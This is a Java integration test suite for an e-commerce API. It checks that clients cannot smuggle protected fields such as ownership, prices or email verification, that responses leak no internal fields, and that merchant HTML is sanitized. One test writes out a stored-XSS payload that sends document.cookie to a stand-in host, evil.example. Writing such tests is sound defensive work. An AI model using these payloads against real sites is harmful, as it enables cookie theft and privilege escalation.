package dev.storeforge.security;

import static org.assertj.core.api.Assertions.assertThat;

import dev.storeforge.support.AuthFlows;
import dev.storeforge.support.CatalogFlows;
import dev.storeforge.support.IntegrationTest;
import dev.storeforge.support.Json;
import dev.storeforge.support.StoreFlows;
import dev.storeforge.support.StoreFlows.Owner;
import dev.storeforge.support.StorefrontFlows;
import java.net.http.HttpResponse;
import java.util.Map;
import java.util.UUID;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.JsonNode;

/**
 * OWASP API3 (object property level authorization). Request bodies are bound to per-use-case
 * records, so fields a client must not control don't exist, and unknown fields are REJECTED (400,
 * {@code fail-on-unknown-properties}) rather than ignored. These tests send them anyway. They also
 * check responses carry no internal fields, and that merchant HTML reaches shoppers sanitized.
 */
class PropertyLevelAuthorizationIT extends IntegrationTest {

    Owner shop;
    Owner other;

    @BeforeEach
    void twoStores() {
        StoreFlows stores = new StoreFlows(api, mailbox);
        shop = stores.newOwnerWithStore(uniqueEmail());
        other = stores.newOwnerWithStore(uniqueEmail());
    }

    /** Every field a client must not set, on the endpoints that would be worth attacking: refused outright. */
    @Test
    void fieldsAClientMustNotSetAreRefusedNotIgnored() {
        String products = "/admin/v1/stores/" + shop.storeId() + "/products";
        String base = "\"title\":\"Lamp\",\"status\":\"ACTIVE\",\"options\":[],\"variants\":[{\"price\":\"10.00\",\"options\":[]}]";
        for (String smuggled : new String[] {"\"storeId\":\"" + other.storeId() + "\"", "\"id\":\"" + UUID.randomUUID() + "\"",
                "\"version\":99", "\"createdAt\":\"2000-01-01T00:00:00Z\""}) {
            assertRefused(api.post(products, "{" + base + "," + smuggled + "}", shop.auth()), smuggled);
        }
        assertRefused(api.post(products, "{\"title\":\"Lamp\",\"options\":[],\"variants\":[{\"price\":\"1.00\",\"options\":[],\"storeId\":\""
                + other.storeId() + "\"}]}", shop.auth()), "variant storeId");
        assertThat(api.post(products, "{" + base + "}", shop.auth()).statusCode()).as("the same request without them works").isEqualTo(201);

        assertRefused(api.post("/admin/v1/stores/" + shop.storeId() + "/discounts",
                "{\"code\":\"SAVE10\",\"kind\":\"PERCENTAGE\",\"value\":\"10\",\"usageCount\":5}", shop.auth()), "usageCount");

        String email = uniqueEmail();
        assertRefused(api.post("/auth/v1/registrations", "{\"email\":\"" + email + "\",\"password\":\"" + AuthFlows.PASSWORD
                + "\",\"emailVerified\":true}"), "emailVerified");
    }

    @Test
    void shoppersCannotSetPricesOrTotals() {
        UUID variant = new CatalogFlows(api).createVariant(shop, "Lamp");   // 10.00
        new CatalogFlows(api).adjustStock(shop, variant, 10, "RECEIVED");
        StorefrontFlows storefront = new StorefrontFlows(api, shop);
        var cart = storefront.newCart();
        assertRefused(api.post("/storefront/v1/carts/" + cart.id() + "/items",
                "{\"variantId\":\"" + variant + "\",\"quantity\":2,\"unitPrice\":\"0.01\"}", storefront.headers(cart.token())), "unitPrice");
        storefront.addItem(cart, variant, 2);
        assertThat(Json.parse(storefront.getCart(cart).body()).get("subtotal").get("amount").asString()).isEqualTo("20.00");

        UUID checkout = UUID.fromString(Json.parse(storefront.startCheckout(cart, uniqueEmail()).body()).get("id").asString());
        Map<String, String> headers = Map.of("X-Cart-Token", cart.token(), "Idempotency-Key", UUID.randomUUID().toString(),
                "X-Forwarded-Host", storefront.headers(null).get("X-Forwarded-Host"));
        HttpResponse<String> lowball = api.request("POST", "/storefront/v1/checkouts/" + checkout + "/completion", "{\"expectedTotal\":\"0.01\"}", headers);
        assertThat(lowball.statusCode()).as("expectedTotal is a guard, not an input: the server's total wins").isEqualTo(409);
        assertThat(Json.parse(lowball.body()).get("code").asString()).isEqualTo("total_changed");
    }

    /** A staff member can't promote themselves, whatever they send. */
    @Test
    void membershipChangesCannotSmuggleOwnership() {
        StoreFlows stores = new StoreFlows(api, mailbox);
        String staffEmail = uniqueEmail();
        var staff = stores.addMember(shop, staffEmail, stores.roleId(shop, "Staff"));
        JsonNode members = Json.parse(api.get("/admin/v1/stores/" + shop.storeId() + "/members", shop.auth()).body()).get("data");
        String staffId = members.valueStream().filter(m -> m.get("email").asString().equals(staffEmail)).findFirst().orElseThrow()
                .get("userId").asString();
        String path = "/admin/v1/stores/" + shop.storeId() + "/members/" + staffId;
        assertRefused(api.patch(path, "{\"roleId\":\"" + stores.roleId(shop, "Staff") + "\",\"isOwner\":true}", StoreFlows.bearer(staff.accessToken())),
                "isOwner");
        HttpResponse<String> promote = api.patch(path, "{\"roleId\":\"" + stores.roleId(shop, "Owner") + "\"}", StoreFlows.bearer(staff.accessToken()));
        assertThat(promote.statusCode()).as(promote.body()).isEqualTo(403);
        assertThat(api.patch("/admin/v1/stores/" + shop.storeId(), "{\"name\":\"Mine now\"}", StoreFlows.bearer(staff.accessToken())).statusCode())
                .as("still without store:manage").isEqualTo(403);
    }

    @Test
    void responsesCarryNoInternalFields() {
        UUID product = new CatalogFlows(api).createProduct(shop, "Tee", "ACTIVE");
        JsonNode storefront = Json.parse(api.get("/storefront/v1/products?limit=50", new StorefrontFlows(api, shop).headers(null)).body())
                .get("data").get(0);
        assertThat(storefront.toString()).doesNotContain("\"sku\"", "\"status\"", "\"version\"", "\"storeId\"", "\"createdAt\"");
        assertThat(product).isNotNull();
        JsonNode me = Json.parse(new AuthFlows(api, mailbox).me(shop.session().accessToken()).body());
        assertThat(me.toString().toLowerCase()).doesNotContain("password", "hash", "token");
    }

    private static void assertRefused(HttpResponse<String> response, String what) {
        assertThat(response.statusCode()).as(what + " → " + response.body()).isEqualTo(400);
        assertThat(Json.parse(response.body()).get("code").asString()).isEqualTo("bad_request");
    }

    /** Stored XSS: whatever writes the description (create or edit; apps can only read products), shoppers get the sanitized version. */
    @Test
    void merchantHtmlReachesShoppersSanitized() {
        String evil = "<p>Warm light.</p><img src=x onerror=\\\"fetch('//evil.example/'+document.cookie)\\\"><script>alert(1)</script>"
                + "<a href=\\\"javascript:alert(1)\\\">care guide</a>";
        api.post("/admin/v1/stores/" + shop.storeId() + "/products", "{\"title\":\"Lamp\",\"handle\":\"xss-lamp\",\"status\":\"ACTIVE\",\"description\":\""
                + evil + "\",\"options\":[],\"variants\":[{\"price\":\"1.00\",\"options\":[]}]}", shop.auth());
        String shown = Json.parse(api.get("/storefront/v1/products/xss-lamp", new StorefrontFlows(api, shop).headers(null)).body())
                .get("description").asString();
        assertThat(shown).isEqualTo("<p>Warm light.</p>care guide");

        // The other write path: editing.
        String id = Json.parse(api.get("/admin/v1/stores/" + shop.storeId() + "/products?limit=50", shop.auth()).body()).get("data").get(0)
                .get("id").asString();
        HttpResponse<String> product = api.get("/admin/v1/stores/" + shop.storeId() + "/products/" + id, shop.auth());
        HttpResponse<String> edited = api.patch("/admin/v1/stores/" + shop.storeId() + "/products/" + id,
                "{\"description\":\"<b>ok</b><script>x()</script>\"}",
                CatalogFlows.withIfMatch(shop, product.headers().firstValue("ETag").orElseThrow()));
        assertThat(Json.parse(edited.body()).get("description").asString()).isEqualTo("<b>ok</b>");
    }
}
